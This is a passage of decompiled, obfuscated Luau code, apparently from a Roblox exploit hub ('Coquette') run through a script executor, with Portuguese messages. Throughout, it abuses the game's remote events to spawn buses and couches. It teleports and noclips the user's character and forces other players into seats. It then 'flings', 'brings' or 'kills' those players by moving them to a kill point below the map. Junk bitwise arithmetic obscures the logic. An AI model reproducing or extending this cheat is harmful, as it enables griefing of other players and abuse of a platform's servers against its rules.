			local values = table.pack(table.unpack(v, 1, v.n))
			table.move(values, 1, values.n, 2, filterDescendantsInstances)
		end

		raycastParams.FilterDescendantsInstances = filterDescendantsInstances
		return upv2:Raycast(Vector3.new(spawnPoint.X, 300, spawnPoint.Z), Vector3.new(0, -600, 0), raycastParams)
	end)

	if ok2 and result2 and result2.Position.Y > 30 and result2.Position.Y < 66 then
		return Vector3.new(spawnPoint.X, result2.Position.Y + 5, spawnPoint.Z)
	end
	return spawnPoint
end

-- payload closure created 742-th (proto #507)
local function payload_fn_742(...)
	local flag = type(307084808) == "buffer"
	local tbl = { ... }
	local n2 = 8810176984

	if tbl[1] == "DeleteAllVehicles" then
		upv1.lastDelete = tick()
	end

	pcall(function()
		upv2:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(tbl))
	end)
end

-- payload closure created 743-th (proto #t8839)
local function payload_fn_743(arg, arg2)
	local n2 = 4467656007

	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", { Title = arg, Text = arg2, Duration = 3 })
	end)
end

-- payload closure created 744-th (proto #t370)
local function payload_fn_744(arg, cFrame)
	local flag = type(0) == "buffer"
	arg.Anchored = false
	arg.CFrame = cFrame
	local v

	return upv1.Heartbeat:Connect(function()
		arg.CFrame = cFrame
		arg.AssemblyLinearVelocity = Vector3.zero
		arg.AssemblyAngularVelocity = Vector3.zero
	end)
end

-- payload closure created 745-th (proto #t5144)
local function payload_fn_745(arg, arg2, arg3, arg4)
	local flag = type(0) == "boolean"
	local v = nil
	local n2 = 750951424

	pcall(function()
		v = upv1.holdAt(arg, arg3)
		local wait = task.wait
		local v2 = arg4
		local n3

		if arg4 then
			n3 = v2
		else
			n3 = 0.2
		end

		wait(n3)
	end)

	if v then
		v:Disconnect()
	end

	pcall(function()
		arg2:ChangeState(Enum.HumanoidStateType.GettingUp)
	end)
end

-- payload closure created 746-th (proto #t8830)
local function payload_fn_746(arg)
	local tbl = {}

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("BasePart") then
			tbl[descendant] = descendant.CanCollide and not descendant:FindFirstAncestorWhichIsA("Accessory")
		end
	end

	return tbl
end

-- payload closure created 747-th (proto #t7686)
local function payload_fn_747(arg)
	for k, v in pairs(arg) do
		if k.Parent then
			k.CanCollide = v
		end
	end
end

-- payload closure created 748-th (proto #t7465)
local function payload_fn_748(arg, arg2, arg3)
	local n2 = 780219089

	pcall(function()
		if arg3 then
			upv1.restoreCollision(arg3)
		end

		arg2.Anchored = false
		arg2.AssemblyLinearVelocity = Vector3.zero
		arg2.AssemblyAngularVelocity = Vector3.zero
		arg.Sit = false
		arg.PlatformStand = false
		arg:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		arg:ChangeState(Enum.HumanoidStateType.GettingUp)
	end)
end

-- payload closure created 749-th (proto #t3807)
local function payload_fn_749(arg, arg2, arg3, arg4)
	local n2 = 2898441593
	local n3 = 598711024
	local n4 = 1907707982
	arg4 = arg4 or upv1.KINDS.bus
	local vehicles = upv2:FindFirstChild("Vehicles")
	local v = table.pack(bit32.band(n3, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	bit32.band(v2[1] * 46779 + bit32.lshift(bit32.band(v2[1] * 0 + bit32.rshift(v[1], 16) * 46779, 65535), 16), 4294967295)
	if not vehicles then
		return nil
	end
	local str = upv3.Name .. "Car"
	arg.Sit = false
	upv1.leaveSeat(arg)
	local v3 = upv1.holdAt(arg2, CFrame.new(upv1.spawnPoint(arg2.Parent)))
	local v4 = nil

	pcall(function()
		for i = 1, 3 do
			local n5 = 0.1
			local v5 = pcall
			local v6 = i
			local v7 = table.pack(bit32.band(v6, 4294967295))
			local v8 = table.pack(bit32.band(v7[1], 65535))
			local v9 = bit32.band(47545 * v8[1] + bit32.lshift(bit32.band(47545 * bit32.rshift(v7[1], 16) + 35273 * v8[1], 65535), 16), 4294967295)
			local v10 = table.pack(bit32.band(bit32.bnot(v6), 4294967295))
			local v11 = table.pack(bit32.band(v10[1], 65535))
			local n6 = 3073134108 + v9 + bit32.band(47545 * v11[1] + bit32.lshift(bit32.band(47545 * bit32.rshift(v10[1], 16) + 35273 * v11[1], 65535), 16), 4294967295)

			v5(function()
				n5 = upv3:GetNetworkPing()
			end)

			task.wait(0.45 + n5 * 2)
			if arg3() then
				return
			end

			if vehicles:FindFirstChild(str) then
				upv1.carRemote("DeleteAllVehicles")
			end

			while true do
				local lastDelete = upv1.lastDelete

				if tick() - lastDelete < upv1.DELETE_COOLDOWN then
					if arg3() then
						return
					end
					task.wait(0.1)
				else
					break
				end
			end

			upv1.carRemote("PickingCar", arg4.car)
			local now = tick()

			while true do
				task.wait(0.1)
				v4 = vehicles:FindFirstChild(str)
				if not (v4 and v4.PrimaryPart or tick() - now > 3.5 or arg3()) then
					continue
				end
				break
			end

			if v4 and v4.PrimaryPart then
				getgenv().CoquetteAssentoLiberado = v4
				task.wait(0.4)
				return
			end

			if v4 then
				upv1.carRemote("DeleteAllVehicles")
			end

			v4 = nil
			if arg3() then
				return
			end
		end
	end)

	v3:Disconnect()
	if not v4 or not v4.PrimaryPart or arg3() then
		return nil
	end
	local now = tick()
	local exitTo = nil
	local vehicleSeat

	while true do
		vehicleSeat = v4:FindFirstChild("VehicleSeat", true)

		if vehicleSeat and vehicleSeat:IsA("BasePart") then
			exitTo = 1
			break
		elseif not (arg3() or not v4.Parent) then
			task.wait(0.1)

			if tick() - now > 3 then
				exitTo = 1
				break
			else
				continue
			end
		end

		break
	end

	if exitTo == 1 then
		if not (vehicleSeat and vehicleSeat:IsA("BasePart")) then
			vehicleSeat = v4:FindFirstChildWhichIsA("VehicleSeat", true) or v4:FindFirstChildWhichIsA("Seat", true)
		end

		if not vehicleSeat then
			return nil
		end

		if arg4.touchSit then
			vehicleSeat.CanTouch = true
			arg.Sit = false
			local n5 = 8855119315

			local connection = upv4.Heartbeat:Connect(function()
				if vehicleSeat.Occupant ~= arg then
					arg2.CFrame = vehicleSeat.CFrame * CFrame.new(0, 0.5, 0)
					arg2.AssemblyLinearVelocity = Vector3.zero
					arg2.AssemblyAngularVelocity = Vector3.zero
				end
			end)

			local now2 = tick()

			while true do
				task.wait()
				local flag = vehicleSeat.Occupant == arg

				if flag then
					local userId = upv3.UserId
					flag = v4:GetAttribute("DriverUserId") == userId
				end

				if not (flag or arg3() or not v4.Parent or tick() - now2 > 6) then
					continue
				end
				break
			end

			connection:Disconnect()
			local flag = vehicleSeat.Occupant ~= arg

			if not flag then
				local userId = upv3.UserId
				flag = v4:GetAttribute("DriverUserId") ~= userId
			end

			if flag then
				return nil
			end
			return v4
		end

		local now2 = tick()

		while true do
			if arg3() then
				return nil
			else
				if vehicleSeat.Occupant ~= arg then
					arg.Sit = false
					local n5 = 316577187
					arg2.CFrame = vehicleSeat.CFrame * CFrame.new(0, 2, 0)
					task.wait()

					pcall(function()
						vehicleSeat:Sit(arg)
					end)
				end

				if vehicleSeat.Occupant == arg then
					break
				end
				task.wait(0.1)
				if not (tick() - now2 > 8) then
					continue
				end
				break
			end
		end

		if vehicleSeat.Occupant ~= arg then
			return nil
		end
		return v4
	end

	return nil
end

-- payload closure created 750-th (proto #t1027)
local function payload_fn_750(arg)
	local tbl = {}

	for _, descendant in ipairs(arg:GetDescendants()) do
		if (descendant:IsA("Seat") or descendant:IsA("VehicleSeat")) and descendant.Name ~= "VehicleSeat" and descendant.Name ~= "PassengerBaby" then
			tbl[#tbl + 1] = descendant
		end
	end

	return tbl
end

-- payload closure created 751-th (proto #t9612)
local function payload_fn_751(arg, arg2)
	local seatPart = arg2.SeatPart
	return seatPart ~= nil and seatPart:IsDescendantOf(arg)
end

-- payload closure created 752-th (proto #t8812)
local function payload_fn_752(arg, arg2, arg3, arg4, arg5)
	local n2 = 2774378671
	local v = arg2[arg4 % #arg2 + 1]
	local v2 = arg:GetPivot():PointToObjectSpace(v.Position)
	local assemblyLinearVelocity = arg3.AssemblyLinearVelocity
	local n3 = 5823
	local vector_ = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)

	if vector_.Magnitude > 60 then
		vector_ = vector_.Unit * 60
	end

	local n4 = arg3.Position + vector_ * 0.1 + Vector3.new(0, (arg4 % 4 - 1.5) * 0.6, 0)

	if arg5 > 3 then
		local vector_2 = Vector3.new
		local n5 = math.random(-6, 6)
		local random = math.random
		local v3 = bit32.bor(n2, n3)
		n4 += vector_2(n5, 0, random(-6, 6))
	end

	local cframe = CFrame.Angles
	arg:PivotTo(CFrame.new(n4) * cframe(0, math.rad(arg4 * 37 % 360), 0) * CFrame.new(-v2))
end

-- payload closure created 753-th (proto #t5297)
local function payload_fn_753(arg, arg2, arg3)
	local n2 = 119509123
	local tbl = {}

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.AssemblyRootPart == descendant then
			tbl[#tbl + 1] = descendant
		end
	end

	local connection = nil
	local n3 = n2 + 73914600 + 19398222

	connection = upv1.Heartbeat:Connect(function()
		if not arg.Parent then
			connection:Disconnect()
			return
		end
		arg:PivotTo(arg2)

		for _, v in ipairs(tbl) do
			v.AssemblyLinearVelocity = Vector3.zero
			v.AssemblyAngularVelocity = Vector3.zero
		end
	end)

	arg:PivotTo(arg2)
	task.wait(arg3)
	connection:Disconnect()
end

-- payload closure created 754-th (proto #t2428)
local function payload_fn_754(arg)
	local flag = type(518060020) == "table"
	local n2 = 9071778293

	pcall(function()
		local seatPart = arg.SeatPart
		seatPart = seatPart and seatPart:FindFirstChild("SeatWeld")

		if seatPart and seatPart:IsA("Weld") and seatPart.Part1 and seatPart.Part1:IsDescendantOf(arg.Parent) then
			seatPart:Destroy()
		end
	end)

	arg.Sit = false
end

-- payload closure created 755-th (proto #t7370)
local function payload_fn_755(arg, arg2, arg3)
	local seatPart = arg.SeatPart
	upv1.leaveSeat(arg)
	local n2 = 8786541738

	pcall(function()
		arg:ChangeState(Enum.HumanoidStateType.Jumping)
	end)

	local now = tick()

	while seatPart and seatPart.Occupant == arg and tick() - now < 1 do
		task.wait()
	end

	upv1.hop(arg2, arg, arg3, 0.1)
end

-- payload closure created 756-th (proto #t8776)
local function payload_fn_756(arg, arg2, arg3)
	local n2 = 1350257489
	local n3 = 339341362
	local n4 = 167810526
	local n5 = 178089864
	local bus = upv1.KINDS[arg3 or "bus"] or upv1.KINDS.bus
	local character = upv2.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local character2 = arg and arg.Character
	character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
	local flag = not humanoid or not humanoidRootPart or not character2

	if not flag then
		flag = character2.Sit
		n4 = bit32.bxor(n4, 4294967295) - 3959346243
	end

	if flag then
		if character2 and character2.Sit then
			upv1.notify(bus.label, "O jogador está sentado em algo.")
		end

		if arg2 == "fling" then
			getgenv().FlingAtivo = false

			if upv3 then
				pcall(function()
					upv3:Set(false)
				end)
			end
		end

		return
	end

	savedPosition = humanoidRootPart.Position
	local cframe = CFrame.new(savedPosition + Vector3.new(0, 5, 0))
	local v = upv1.saveCollision(character)
	local n6 = n5 + n4

	if arg2 == "fling" then
		getgenv().FlingAtivo = true
	end

	upv4 = true

	local function fn()
		return upv4 and (arg2 ~= "fling" or getgenv().FlingAtivo)
	end

	local v2 = bit32.bxor(n4, 557537458)

	local function fn2()
		return not fn()
	end

	local v3 = upv1.isLocked()

	if v3 then
		upv1.setLocked(false)
	end

	local ok2, result2 = pcall(upv1.spawn, humanoid, humanoidRootPart, fn2, bus)

	if not ok2 or not result2 then
		local v4 = fn2()
		local n7 = n6 + v2
		getgenv().CoquetteAssentoLiberado = nil

		if v3 then
			task.spawn(upv1.setLocked, true)
		end

		upv1.carRemote("DeleteAllVehicles")
		upv1.restore(humanoid, humanoidRootPart, v)
		upv1.hop(humanoidRootPart, humanoid, cframe, 0.2)
		upv1.restore(humanoid, humanoidRootPart, v)

		if not v4 then
			local v5 = upv1
			v5.notify(bus.label, bus.spawnFail)
		end

		if arg2 == "fling" then
			local genv = getgenv()
			local v5 = bit32.bor(v2, n7)
			genv.FlingAtivo = false

			if upv3 then
				local n8 = 865033476

				pcall(function()
					upv3:Set(false)
				end)
			end
		end

		upv4 = false
		return
	end

	upv5()

	for _, descendant in ipairs(result2:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.CanCollide = false
		end
	end

	local v4 = upv1.passengerSeats(result2)
	local now = tick()

	while #v4 == 0 and tick() - now < 2 and result2.Parent do
		task.wait(0.1)
		v4 = upv1.passengerSeats(result2)
	end

	if upv6 then
		upv6:Disconnect()
	end

	local v5 = upv7
	local v6 = table.pack(bit32.band(n6, 4294967295))
	local v7 = table.pack(bit32.band(v2, 4294967295))
	local v8 = table.pack(bit32.band(v6[1], 65535))
	local v9 = table.pack(bit32.rshift(v6[1], 16))
	local v10 = table.pack(bit32.band(v7[1], 65535))
	local v11 = bit32.band(v8[1] * v10[1] + bit32.lshift(bit32.band(v8[1] * bit32.rshift(v7[1], 16) + v9[1] * v10[1], 65535), 16), 4294967295)

	upv6 = v5.Stepped:Connect(function()
		if not upv4 then
			return
		end

		for k in pairs(v) do
			if k.CanCollide then
				k.CanCollide = false
			end
		end
	end)

	local now2 = tick()
	local n7 = 0
	local flag2 = false
	local now3 = nil

	local function fn3(arg4, arg5)
		local n8 = 472295656
		if flag2 then
			return
		end
		flag2 = true
		local v12 = bit32.bxor(n8, 498677063)
		flingConnection:Disconnect()
		flingConnection = nil
		local v13 = task
		local v14 = table.pack(bit32.band(v12, 4294967295))
		local v15 = table.pack(bit32.band(v14[1], 65535))
		local n9 = bit32.band(32371 * v15[1] + bit32.lshift(bit32.band(32371 * bit32.rshift(v14[1], 16) + 23870 * v15[1], 65535), 16), 4294967295) + 2637232693
		local v16 = table.pack(bit32.band(bit32.bor(v12, 272470711), 4294967295))
		local v17 = table.pack(bit32.band(v16[1], 65535))
		local v18 = bit32.band(794 * v17[1] + bit32.lshift(bit32.band(794 * bit32.rshift(v16[1], 16) + 17795 * v17[1], 65535), 16), 4294967295)
		local v19 = table.pack(bit32.band(bit32.bxor(v12, 272470711), 4294967295))
		local v20 = table.pack(bit32.band(v19[1], 65535))
		local n10 = n9 + v18 + bit32.band(32372 * v20[1] + bit32.lshift(bit32.band(32372 * bit32.rshift(v19[1], 16) + 23870 * v20[1], 65535), 16), 4294967295)

		v13.spawn(function()
			local n11 = 3691221258
			local v21 = bit32.bxor(n10, 436856850)
			local n12 = 606571859
			local n13 = 3098780686
			local flag3 = false
			local fallenPartsDestroyHeight = upv8.FallenPartsDestroyHeight
			local v22 = v21

			pcall(function()
				local n14 = 3554011481
				local v23 = bit32.bxor(v22, 3840680986)
				local n15 = 3699766375

				if arg4 and fn() then
					if arg2 == "bring" then
						local holdVehicle = upv1.holdVehicle
						local cframe2 = CFrame.new
						local v24 = savedPosition
						local v25 = Vector3
						local v26 = bit32.band(v23, n15)
						holdVehicle(result2, cframe2(v24 + v25.new(0, bus.bringLift, 0)), 0.6)
					else
						if arg2 == "kill" then
							upv8.FallenPartsDestroyHeight = -500
						end

						local cframe2 = CFrame.new(arg2 == "kill" and upv1.KILL_POINT or upv1.FLING_POINT)
						local v24 = bit32.band(n15, v23)

						if bus.touchSit then
							local n16 = 0.1
							local n17 = 56191066

							pcall(function()
								n16 = upv2:GetNetworkPing()
							end)

							upv1.holdVehicle(result2, cframe2, 0.5 + n16 * 2)
						else
							result2:PivotTo(cframe2)
							task.wait(0.12)
						end

						upv1.escape(humanoid, humanoidRootPart, cframe)
						flag3 = true

						if arg2 == "kill" then
							local now4 = tick()

							while tick() - now4 < 3 do
								local character3 = arg.Character
								character3 = character3 and character3:FindFirstChildOfClass("Humanoid")
								if not (not character3 or character3.Health <= 0) then
									task.wait(0.1)
									continue
								end
								break
							end
						else
							task.wait(1)
						end
					end
				else
					local v24 = arg4
					local v25 = bit32.bxor(v23, 3485028015)

					if not v24 and fn() then
						upv1.notify(bus.label, arg5 or "Não consegui sentar o alvo.")
					end
				end
			end)

			upv8.FallenPartsDestroyHeight = fallenPartsDestroyHeight

			if upv6 then
				upv6:Disconnect()
				upv6 = nil
			end

			local n14 = v21 // 108
			upv1.restore(humanoid, humanoidRootPart, v)
			local v23 = upv1
			v23.carRemote("DeleteAllVehicles")

			if not flag3 then
				upv1.hop(humanoidRootPart, humanoid, cframe, 0.2)
			end

			pcall(function()
				for _, descendant in ipairs(upv8:GetDescendants()) do
					if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
						descendant.Disabled = false
					end
				end

				upv9:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer("CharacterSizeUp", 1)
			end)

			upv5()
			task.wait(0.2)
			upv1.restore(humanoid, humanoidRootPart, v)
			getgenv().CoquetteAssentoLiberado = nil

			if v3 then
				upv1.setLocked(true)
			end

			if arg2 == "fling" then
				getgenv().FlingAtivo = false

				if upv3 then
					local n15 = 154536895

					pcall(function()
						upv3:Set(false)
					end)
				end
			end

			upv4 = false
		end)
	end

	local v12 = v11

	flingConnection = upv7.Heartbeat:Connect(function()
		local n8 = 3568540447
		local n9 = 1885066782
		local v13 = bit32.bxor(v12, 222038872)
		if flag2 then
			return
		end

		if not fn() or not result2.Parent then
			fn3(false)
			return
		end
		local n10 = tick() - now2
		if not arg.Parent then
			fn3(false, "O jogador saiu do servidor.")
			return
		end
		local character3 = arg.Character
		local humanoidRootPart2

		if character3 then
			humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
		else
			humanoidRootPart2 = character3
		end

		character3 = character3 and character3:FindFirstChildOfClass("Humanoid")

		if not humanoidRootPart2 or not character3 or character3.Health <= 0 then
			if upv1.CAPTURE_TIMEOUT + 2 < n10 then
				fn3(false)
			end

			return
		end

		if upv1.captured(result2, character3) then
			fn3(true)
			return
		end

		if character3.Sit then
			now3 = now3 or tick()

			if tick() - now3 > 0.6 then
				local v14 = fn3
				v14(false, "O jogador sentou em outro lugar.")
				return
			end
		else
			now3 = nil
		end

		if upv1.CAPTURE_TIMEOUT < n10 then
			fn3(false)
			return
		end
		n7 += 1

		if #v4 == 0 then
			v4 = upv1.passengerSeats(result2)
		end

		if #v4 > 0 then
			for _, v14 in ipairs(v4) do
				if not v14.CanTouch then
					v14.CanTouch = true
				end
			end

			pcall(upv1.place, result2, v4, humanoidRootPart2, n7, n10)
		end
	end)
end

-- payload closure created 757-th (proto #t5983)
local function payload_fn_757(arg, arg2, arg3)
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	if humanoid.Sit then
		local n2 = 8985041952

		pcall(function()
			local StarterGui = game:GetService("StarterGui")
			local setCore = StarterGui.SetCore

			setCore(StarterGui, "SendNotification", {
				Title = (upv2.KINDS[arg3 or "bus"] or upv2.KINDS.bus).label,
				Text = "O jogador está sentado em algo.",
				Duration = 3,
			})
		end)

		return
	end

	upv2.run(arg, arg2 and "bring" or "kill", arg3)
end

-- payload closure created 758-th (proto #779)
local function payload_fn_758()
	local flag = (upv1 or upv2) and upv3 ~= nil
	local flag2 = flag and not upv4.sofaBackup

	if flag2 and upv5.Character then
		upv4.sofaBackup = upv4.saveCollision(upv5.Character)
	elseif not flag and upv4.sofaBackup then
		upv4.restoreCollision(upv4.sofaBackup)
		upv4.sofaBackup = nil
	end

	if (upv1 or upv2) and upv6 and upv5.Character and upv5.Character:FindFirstChild("HumanoidRootPart") and upv6.Character and upv6.Character:FindFirstChild("HumanoidRootPart") then
		local n2 = 373993828


		local n3 = n2 + 302204182

		pcall(function()
			local n4 = 319104013
			local v = bit32.bxor(n3, 2217407969)
			local n5 = 53244655
			local humanoidRootPart = upv5.Character.HumanoidRootPart
			local humanoidRootPart2 = upv6.Character.HumanoidRootPart
			local v2 = upv1
			local n6 = 5176242

			if (v2 or upv2) and upv3 then
				local n7 = 120906379

				if upv7 then
					local humanoid = upv5.Character:FindFirstChildOfClass("Humanoid")

					if humanoid and humanoid.Sit then
						humanoid.Sit = false
						humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
					end
				end

				local n8 = os.clock() - upv8
				local n9 = n5 + 377147472
				local v3 = n9
				local v4 = table.pack(bit32.band(n7, 4294967295))
				local v5 = table.pack(bit32.band(v4[1], 65535))
				local n10 = bit32.band(25096 * v5[1] + bit32.lshift(bit32.band(25096 * bit32.rshift(v4[1], 16) + 33539 * v5[1], 65535), 16), 4294967295) + 1516052120
				local v6 = table.pack(bit32.band(bit32.band(361290515, n7), 4294967295))
				local v7 = table.pack(bit32.band(v6[1], 65535))
				local v8 = bit32.band(15344 * v7[1] + bit32.lshift(bit32.band(15344 * bit32.rshift(v6[1], 16) + 63993 * v7[1], 65535), 16), 4294967295)
				local v9 = table.pack(bit32.band(bit32.bxor(n7, 361290515), 4294967295))
				local v10 = table.pack(bit32.band(v9[1], 65535))
				local n11 = n10 + v8 + bit32.band(40441 * v10[1] + bit32.lshift(bit32.band(40441 * bit32.rshift(v9[1], 16) + 31996 * v10[1], 65535), 16), 4294967295)

				if n8 >= 10 then
					local v11 = upv9
					upv1 = false
					local v12 = table.pack(bit32.band(n9, 4294967295))
					local v13 = table.pack(bit32.band(v12[1], 65535))
					local v14 = bit32.band(15135 * v13[1] + bit32.lshift(bit32.band(15135 * bit32.rshift(v12[1], 16) + 13966 * v13[1], 65535), 16), 4294967295)
					local v15 = table.pack(bit32.band(bit32.bnot(n9), 4294967295))
					local v16 = table.pack(bit32.band(v15[1], 65535))
					local n12 = 1295234513 + v14 + bit32.band(15135 * v16[1] + bit32.lshift(bit32.band(15135 * bit32.rshift(v15[1], 16) + 13966 * v16[1], 65535), 16), 4294967295)
					upv2 = false
					local n13 = n12 - 26228103
					upv3 = nil
					upv10 = nil
					upv9 = nil

					task.spawn(function()
						local n14 = 8919124085

						pcall(function()
							upv11:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "Couch")
						end)

						local character = upv5.Character
						local humanoidRootPart3 = character and character:FindFirstChild("HumanoidRootPart")
						character = character and character:FindFirstChildOfClass("Humanoid")

						if upv4.sofaBackup then
							upv4.restoreCollision(upv4.sofaBackup)
							upv4.sofaBackup = nil
						end

						if humanoidRootPart3 and v11 then
							humanoidRootPart3.Anchored = true
							humanoidRootPart3.CFrame = CFrame.new(v11 + Vector3.new(0, 5, 0))
							humanoidRootPart3.AssemblyLinearVelocity = Vector3.zero
							humanoidRootPart3.AssemblyAngularVelocity = Vector3.zero
							humanoidRootPart3.Anchored = false

							if character then
								character:ChangeState(Enum.HumanoidStateType.GettingUp)
							end
						end

						upv12(false)
					end)

					return
				end

				for _, descendant in ipairs(upv5.Character:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant ~= upv10 then
						descendant.CanCollide = false
					end
				end

				if upv10 and upv10.Parent then
					upv10.CanCollide = true
					upv10.CanTouch = true
				end

				local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
				local vector_ = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)

				if vector_.Magnitude > 40 then
					vector_ = vector_.Unit * 40
				end

				local n12 = 0.12

				local function fn()
					n12 = math.clamp(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000, 0.04, 0.35)
				end

				pcall(fn)
				local n13 = v + bit32.bxor(v3, 0)
				local n14 = v3 - 376551846
				local clamp = math.clamp
				local n15 = vector_.Magnitude / 16
				local v11 = bit32.bxor(n14, 0)
				local v12 = table.pack(bit32.band(n6, 4294967295))
				local v13 = table.pack(bit32.band(v11, 4294967295))
				local v14 = table.pack(bit32.band(v12[1], 65535))
				local v15 = table.pack(bit32.rshift(v12[1], 16))
				local v16 = table.pack(bit32.band(v13[1], 65535))
				local v17 = bit32.band(v14[1] * v16[1] + bit32.lshift(bit32.band(v14[1] * bit32.rshift(v13[1], 16) + v15[1] * v16[1], 65535), 16), 4294967295)
				local v18 = clamp(n15, 0, 1)
				local n16 = humanoidRootPart2.Position + vector_ * math.clamp(n12 * 1.35 + v18 * 0.06 + v18 * math.clamp(n8 / 10, 0, 1) * 0.55, 0.08, 0.75)
				local magnitude = vector_.Magnitude
				local n17 = 0

				if magnitude < 2 then
					n4 = n13
					local n18 = math.clamp((n8 - 0.75) / 2, 0, 1)
					n17 = math.sin(n8 * 16) * 0.65 * n18
				end

				local z = n16.Z
				local vector_2 = Vector3.new(n16.X, upv13(upv6.Character, humanoidRootPart2) + n17, z)
				local n18 = n8 * 18
				local n19 = v17 // n13
				local vector_3 = Vector3.new
				local v19 = math.cos(n18)
				local v20 = math
				local v21 = table.pack(bit32.band(v19, 4294967295))
				local v22 = table.pack(bit32.band(v21[1], 65535))
				local v23 = bit32.band(15196 * v22[1] + bit32.lshift(bit32.band(15196 * bit32.rshift(v21[1], 16) + 43059 * v22[1], 65535), 16), 4294967295)
				local v24 = table.pack(bit32.band(bit32.bnot(v19), 4294967295))
				local v25 = table.pack(bit32.band(v24[1], 65535))
				local n20 = 3264759385 + n14 + v23 + bit32.band(15196 * v25[1] + bit32.lshift(bit32.band(15196 * bit32.rshift(v24[1], 16) + 43059 * v25[1], 65535), 16), 4294967295)
				local n21 = vector_2 + vector_3(v19 * 1.65, 0, v20.sin(n18) * 1.65)
				local vector_4 = Vector3.new(vector_2.X - n21.X, 0, vector_2.Z - n21.Z)
				local v26 = bit32.rshift(n13, 15)

				if vector_4.Magnitude < 0.01 then
					vector_4 = Vector3.new(0, 0, -1)
				end

				local cframe = CFrame.lookAt
				local unit = vector_4.Unit
				local v27 = cframe(n21, n21 + unit)
				upv5.Character:PivotTo(CFrame.new(n21) * v27.Rotation * upv3.Rotation * upv3:Inverse())
				humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
				local v28 = bit32.bxor(n19, 4294967295)
				humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			else
				local cframe = CFrame.Angles
				local rad = math.rad
				local n7 = upv14.DistributedGameTime * 18000
				upv5.Character:PivotTo(CFrame.new(humanoidRootPart2.Position) * cframe(math.rad(upv14.DistributedGameTime * 12000), math.rad(upv14.DistributedGameTime * 15000), rad(n7)))
			end
		end)
	end
end

-- payload closure created 759-th (proto #780)
local function payload_fn_759()
	if (upv1 or upv2) and upv3 and upv3.Character and upv3.Character:FindFirstChild("Humanoid") then
		local flag = type(385777480) == "nil"
		local n2 = 796927985

		pcall(function()
			local v = bit32.bxor(n2, 953299172)
			local v2 = bit32.band(3539936671, v)

			if upv3.Character.Humanoid.Sit then
				local v3 = upv1
				local v4 = upv2
				upv1 = false
				upv2 = false
				upv4 = nil
				upv5 = nil

				if v3 then
					if upv6.Character and upv6.Character:FindFirstChild("HumanoidRootPart") then
						upv6.Character:SetPrimaryPartCFrame(CFrame.new(0, -500, 0))
						task.wait(0.6)
						local n3 = 253722284

						pcall(function()
							upv7:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "Couch")
						end)
					end
				end

				if upv6.Character and upv6.Character:FindFirstChild("HumanoidRootPart") and upv8 then
					local humanoidRootPart = upv6.Character:FindFirstChild("HumanoidRootPart")
					local humanoid = upv6.Character:FindFirstChild("Humanoid")

					if humanoidRootPart then
						humanoidRootPart.Anchored = true
						local v5 = bit32.lshift(v, 11)
						humanoidRootPart.CFrame = CFrame.new(upv8 + Vector3.new(0, 5, 0))
						task.wait(0.2)
						humanoidRootPart.Velocity = Vector3.zero
						humanoidRootPart.RotVelocity = Vector3.zero
						humanoidRootPart.Anchored = false

						if humanoid then
							humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
						end
					end

					upv8 = nil
				end

				local n3 = v2 * 2

				if upv9.sofaBackup then
					upv9.restoreCollision(upv9.sofaBackup)
					upv9.sofaBackup = nil
				end

				if v4 then
					local n4 = 455796653
					task.wait(0.6)

					pcall(function()
						upv7:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "Couch")
					end)
				end

				upv10(false)
			end
		end)
	end
end

-- payload closure created 760-th (proto #501)
local function payload_fn_760(arg)
	upv1 = arg or "Matar"
end

-- payload closure created 761-th (proto #504)
local function payload_fn_761()
	local n2 = 97862835
	local n3 = 1262739938
	local n4 = 3991242560
	local n5 = 3453348826
	upv1 = false
	upv2 = false
	upv3 = false
	upv4 = nil
	upv5 = nil
	upv6(false)

	if upv7 then
		upv7:Disconnect()
		upv7 = nil
	end

	flingConnection:Disconnect()
	flingConnection = nil
	local v = getgenv
	local v2 = bit32.bor(n5, n4)
	local coquetteAllActions = v().CoquetteAllActions

	if coquetteAllActions then
		if coquetteAllActions.BringBus then
			coquetteAllActions.BringBus(false)
		end

		if coquetteAllActions.FillBus then
			coquetteAllActions.FillBus(false)
		end

		local bringCouch = coquetteAllActions.BringCouch

		if bringCouch then
			local bringCouch2 = coquetteAllActions.BringCouch
			n4 = bit32.band(n4, v2)
			bringCouch2(false)
		end

		if coquetteAllActions.KillCouch then
			coquetteAllActions.KillCouch(false)
		end

		if coquetteAllActions.KillBus then
			coquetteAllActions.KillBus(false)
		end

		if coquetteAllActions.KillGyro then
			coquetteAllActions.KillGyro(false)
		end

		if coquetteAllActions.BringGyro then
			coquetteAllActions.BringGyro(false)
		end

		if coquetteAllActions.ToggleBall then
			coquetteAllActions.ToggleBall()
		end

		if coquetteAllActions.FlingBoat then
			coquetteAllActions.FlingBoat(false)
		end
	end

	local genv = getgenv()
	local v3 = table.pack(bit32.band(n2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
